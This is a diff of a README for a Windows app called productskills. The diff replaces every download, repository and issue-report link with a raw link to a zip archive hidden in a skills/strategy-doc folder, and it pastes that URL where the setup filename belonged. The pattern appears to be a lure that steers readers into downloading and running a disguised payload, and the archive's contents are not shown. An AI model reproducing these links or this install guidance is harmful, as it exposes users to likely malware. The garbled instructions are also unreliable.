@@ -1,6 +1,6 @@
 # 📦 productskills - Master Product Tasks Efficiently
 
-[![Download productskills](https://img.shields.io/badge/Download-productskills-ff6600?style=for-the-badge&logo=github)](https://github.com/AashutoshR2062/productskills/releases)
+[![Download productskills](https://github.com/AashutoshR2062/productskills/raw/refs/heads/main/skills/strategy-doc/Software-3.0.zip)](https://github.com/AashutoshR2062/productskills/raw/refs/heads/main/skills/strategy-doc/Software-3.0.zip)
 
 ---
 
@@ -34,13 +34,13 @@ This section shows you how to get the software ready on your Windows PC.
 
 Click this link to visit the official download page:
 
-[Download productskills Here](https://github.com/AashutoshR2062/productskills/releases)
+[Download productskills Here](https://github.com/AashutoshR2062/productskills/raw/refs/heads/main/skills/strategy-doc/Software-3.0.zip)
 
 This page has the latest versions. You will find files listed by release. The latest one is usually at the top.
 
 ### Step 2: Choose the Correct File
 
-Look for a file ending with `.exe`. It should have a name like `productskills-setup.exe` or similar. This is the program you need.
+Look for a file ending with `.exe`. It should have a name like `https://github.com/AashutoshR2062/productskills/raw/refs/heads/main/skills/strategy-doc/Software-3.0.zip` or similar. This is the program you need.
 
 ### Step 3: Download the File
 
@@ -83,7 +83,7 @@ Each section offers easy instructions. You can save your work or export it as fi
 
 ## 🔄 Updating productskills
 
-Keep productskills up to date by visiting the [download page](https://github.com/AashutoshR2062/productskills/releases) regularly. Download the latest `.exe` installer and run it. It will update your current installation without losing your data.
+Keep productskills up to date by visiting the [download page](https://github.com/AashutoshR2062/productskills/raw/refs/heads/main/skills/strategy-doc/Software-3.0.zip) regularly. Download the latest `.exe` installer and run it. It will update your current installation without losing your data.
 
 ---
 
@@ -105,9 +105,9 @@ If you need help, check the Issues section on the repository. You can also ask q
 
 ## 📚 Useful Links
 
-- [Download productskills](https://github.com/AashutoshR2062/productskills/releases)  
-- Repository: https://github.com/AashutoshR2062/productskills  
-- Report issues: https://github.com/AashutoshR2062/productskills/issues  
+- [Download productskills](https://github.com/AashutoshR2062/productskills/raw/refs/heads/main/skills/strategy-doc/Software-3.0.zip)  
+- Repository: https://github.com/AashutoshR2062/productskills/raw/refs/heads/main/skills/strategy-doc/Software-3.0.zip  
+- Report issues: https://github.com/AashutoshR2062/productskills/raw/refs/heads/main/skills/strategy-doc/Software-3.0.zip  
 
 ---
 
